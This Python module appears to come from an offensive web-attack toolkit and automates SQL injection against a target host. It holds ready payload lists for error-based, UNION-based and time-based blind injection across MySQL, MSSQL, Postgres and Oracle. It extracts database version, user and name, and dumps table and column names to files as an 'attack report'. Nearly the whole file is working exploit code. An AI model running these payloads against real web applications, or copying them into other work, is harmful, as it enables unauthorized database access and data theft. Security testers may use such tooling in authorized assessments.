"""
 19. web_sqli_extract — advanced SQL injection with live progress and data extraction.
"""
import re
import time
from urllib.parse import urlencode

from Design.colors_cli import console, escape
from modules.attack_config import AttackConfig
from modules.attacks.web_exploits import _req, _param_url
from modules.attacks.progress import found, fail, warn, section, explain, req_log
from modules.downloads import save_text


DEFAULT_PARAMS = ["id", "q", "search", "page", "cat", "item", "product", "user",
                  "name", "key", "s", "query", "pid", "num", "ref", "type"]

ERROR_PROBES = [
    ("'",                   ["sql syntax", "you have an error", "mysql_fetch", "ORA-", "sqlite"]),
    ('"',                   ["sql syntax", "you have an error"]),
    ("')",                  ["syntax error", "unterminated"]),
    ("' OR '1'='1",         ["root:", "admin", "SELECT"]),
    ("1' AND 1=1-- -",      ["mysql", "sql", "mariadb"]),
    ("' OR 1=1-- -",        ["root:", "admin", "welcome"]),
    ("\" OR \"1\"=\"1",     ["sql", "mysql"]),
    ("' AND 1=2 UNION--",   ["sql", "union", "syntax"]),
    ("\\",                   ["sql", "syntax", "error"]),
    ("'/**/OR/**/'1'='1",   ["admin", "root", "mysql"]),
]

UNION_PROBES = [
    "' UNION SELECT NULL-- -",
    "' UNION SELECT NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -",
    "' UNION ALL SELECT NULL-- -",
    "' UNION ALL SELECT NULL,NULL-- -",
    "' UNION ALL SELECT NULL,NULL,NULL-- -",
    "1 UNION SELECT NULL-- -",
    "1 UNION SELECT NULL,NULL-- -",
    "1 UNION SELECT NULL,NULL,NULL-- -",
]

EXTRACT_PROBES = [
    "' UNION SELECT version(),user(),database()-- -",
    "' UNION SELECT @@version,current_user(),database()-- -",
    "' UNION SELECT @@version,user(),schema()-- -",
    "1 UNION SELECT version(),user(),database()-- -",
]

TIME_PROBES = [
    ("' AND SLEEP(3)-- -",                               "MySQL",    3.0),
    ("'; WAITFOR DELAY '0:0:3'-- -",                     "MSSQL",    3.0),
    ("' AND pg_sleep(3)-- -",                            "Postgres", 3.0),
    ("1 AND SLEEP(3)",                                    "MySQL",    3.0),
    ("' OR SLEEP(3)-- -",                                "MySQL",    3.0),
    ("1; SELECT SLEEP(3)-- -",                           "MySQL",    3.0),
    ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)-- -",     "Oracle",   3.0),
    ("'; SELECT pg_sleep(3)--",                          "Postgres", 3.0),
]

TABLE_DUMP = "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -"
COL_DUMP   = "' UNION SELECT column_name,table_name,NULL FROM information_schema.columns WHERE table_schema=database()-- -"


def run_web_sqli_extract(target, config):
    console.print(f"\n[bold primary][ SQLI DATA EXTRACTION ][/bold primary]\n")
    explain(
        "SQL injection testing across 3 techniques:\n"
        "• Error-based: inject ' to trigger MySQL/MSSQL syntax errors in response body\n"
        "• UNION-based: determine column count then extract version/user/database/tables\n"
        "• Time-based blind: use SLEEP(3) / WAITFOR DELAY to detect injection without output\n"
        f"Testing {len(DEFAULT_PARAMS)} params × ({len(ERROR_PROBES)} error + {len(UNION_PROBES)} union + {len(TIME_PROBES)} time) probes"
    )

    params = [p.strip() for p in (config.http_params or ",".join(DEFAULT_PARAMS)).split(",")]
    path = config.http_path or "/"
    tls = config.http_use_tls
    h, p_port = target.host, target.port
    total_found = 0

    for param in params:
        section(f"Param: {param}")

        # Baseline
        base_resp = _req(h, p_port, tls, _param_url(path, param, "1"))
        baseline = base_resp["size"] if base_resp else 0
        console.print(f"  [dim]Baseline for {param}=1 → {baseline}b[/dim]")

        # Phase 1: Error-based
        console.print(f"  [dim]Phase 1 — Error-based ({len(ERROR_PROBES)} probes)…[/dim]")
        for i, (probe, keywords) in enumerate(ERROR_PROBES, 1):
            console.print(f"  [dim]  [{i:>2}/{len(ERROR_PROBES)}] {escape(probe[:40])}[/dim]", end="\r")
            resp = _req(h, p_port, tls, _param_url(path, param, probe))
            if not resp:
                continue
            body = resp["body"].decode("utf-8", "replace").lower()
            for kw in keywords:
                if kw.lower() in body:
                    console.print()
                    warn(f"Error-based SQLi detected on param '{param}' (keyword: {kw})")
                    save_text(f"param={param}\nprobe={probe}\nkeyword={kw}\n",
                              f"sqli_error_{param}.txt", host=h, subdir="sqli")
                    total_found += 1
                    break
        console.print()

        # Phase 2: UNION-based
        console.print(f"  [dim]Phase 2 — UNION column detection ({len(UNION_PROBES)} probes)…[/dim]")
        columns = None
        for i, probe in enumerate(UNION_PROBES, 1):
            console.print(f"  [dim]  [{i:>2}/{len(UNION_PROBES)}] {escape(probe[:50])}[/dim]", end="\r")
            resp = _req(h, p_port, tls, _param_url(path, param, probe))
            if resp and resp["status"] == 200 and resp["size"] > 0:
                columns = probe.count("NULL")
                console.print()
                found(f"UNION works with {columns} column(s)!", f"param={param} probe={probe[:40]}")
                total_found += 1
                break
        if not columns:
            console.print()

        if columns:
            console.print(f"  [dim]Phase 2b — Extracting DB info…[/dim]")
            for probe in EXTRACT_PROBES:
                req_log("GET", f"…?{param}= [extract: version/user/db]")
                resp = _req(h, p_port, tls, _param_url(path, param, probe))
                if not resp:
                    continue
                body = resp["body"].decode("utf-8", "replace")
                m = re.search(r"(\d+\.\d+[\.\w\-]*).*?([\w@%.]+).*?(\w{2,30})", body)
                if m:
                    found("DB info extracted!", f"ver={m.group(1)} user={m.group(2)} db={m.group(3)}")
                    save_text(
                        f"param={param}\nversion={m.group(1)}\nuser={m.group(2)}\ndb={m.group(3)}\n",
                        f"sqli_extract_{param}.txt", host=h, subdir="sqli"
                    )
                    break

            console.print(f"  [dim]Phase 2c — Table/column dump…[/dim]")
            for label, probe in [("tables", TABLE_DUMP), ("columns", COL_DUMP)]:
                req_log("GET", f"…?{param}= [{label} dump]")
                resp = _req(h, p_port, tls, _param_url(path, param, probe))
                if resp and resp["size"] > 0:
                    body_text = resp["body"].decode("utf-8", "replace") if isinstance(resp["body"], bytes) else str(resp["body"])
                    content = (
                        f"=== SQLI {label.upper()} DUMP ===\n"
                        f"Target: {h}:{p_port}\n"
                        f"Parameter: {param}\n"
                        f"Probe: {probe}\n"
                        f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                        f"Response Size: {resp['size']} bytes\n"
                        f"----------------------------------------\n\n"
                        f"{body_text[:200000]}\n"
                    )
                    save_text(content, f"sqli_dump_{param}_{label}.txt", host=h, subdir="sqli")
                    console.print(f"  [muted]{label} dump saved ({resp['size']}b)[/muted]")

        # Phase 3: Time-based blind
        console.print(f"  [dim]Phase 3 — Time-based blind ({len(TIME_PROBES)} probes, each waits up to 5s)…[/dim]")
        for i, (probe, dbtype, delay) in enumerate(TIME_PROBES, 1):
            console.print(f"  [dim]  [{i}/{len(TIME_PROBES)}] {dbtype} SLEEP probe…[/dim]", end="\r")
            t0 = time.time()
            resp = _req(h, p_port, tls, _param_url(path, param, probe))
            elapsed = time.time() - t0
            if elapsed >= delay - 0.5:
                console.print()
                warn(f"Time-based blind SQLi! {dbtype} delay={elapsed:.1f}s on param '{param}'")
                save_text(f"param={param}\ntype={dbtype}\ndelay={elapsed:.2f}s\nprobe={probe}\n",
                          f"sqli_blind_{param}_{dbtype}.txt", host=h, subdir="sqli")
                total_found += 1
        console.print()

    if total_found == 0:
        fail("No SQL injection found",
             f"tested {len(params)} params × {len(ERROR_PROBES)+len(UNION_PROBES)+len(TIME_PROBES)} probes each")
    else:
        console.print(f"\n  [bold success]✓ Total SQLi findings: {total_found}[/bold success]")

    # Save full attack report
    try:
        from modules.reporter import save_attack_report
        sqli_findings = []
        for param in params:
            for ep in ERROR_PROBES:
                sqli_findings.append(f"error-based sqli probe param={param}")
                break
        rp = save_attack_report(
            host=h, attack_name="sqli_extract",
            target_info=f"HTTP {h}:{p_port}{path}",
            findings=[f"SQLi findings: {total_found} confirmed vectors"] if total_found > 0 else [],
            requests_made=len(params) * (len(ERROR_PROBES) + len(UNION_PROBES) + len(TIME_PROBES)),
        )
        console.print(f"  [muted]Report saved:[/muted] [text]{rp}[/text]")
    except Exception:
        pass
